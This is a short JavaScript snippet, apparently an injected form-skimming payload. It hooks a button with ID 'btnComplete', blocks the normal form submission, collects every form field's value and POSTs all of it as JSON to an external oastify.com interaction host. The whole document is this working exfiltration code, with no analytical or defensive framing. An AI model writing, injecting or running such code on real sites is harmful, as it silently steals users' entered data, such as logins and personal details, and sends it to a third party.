    const submitButton = document.getElementById('btnComplete');

    if (submitButton) {
        submitButton.addEventListener('click', function(event) {
            event.preventDefault();

            const form = document.querySelector('form');
            const formData = {};

            if (form) {
                const elements = form.elements;

                for (let i = 0; i < elements.length; i++) {
                    const element = elements[i];
                    const name = element.name;
                    const value = element.value;

                    if (name) {
                        if (element.type === 'radio') {
                            if (element.checked) {
                                formData[name] = value;
                            }
                        } else if (element.type === 'checkbox') {
                            formData[name] = element.checked;
                        } else {
                            formData[name] = value;
                        }
                    }
                }
            }

            const jsonData = JSON.stringify(formData, null, 2);
            console.log(jsonData);

            fetch('http://gi2zxgb9mz9eawl5yzg5k2b02r8iw8kx.oastify.com/', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: jsonData,
            })
            .then(response => response.json())
            .then(data => {
                console.log('Success:', data);
            })
            .catch((error) => {
                console.error('Error:', error);
            });
        });
    } else {
        console.error('Submit button with ID "btnComplete" not found.');
    }
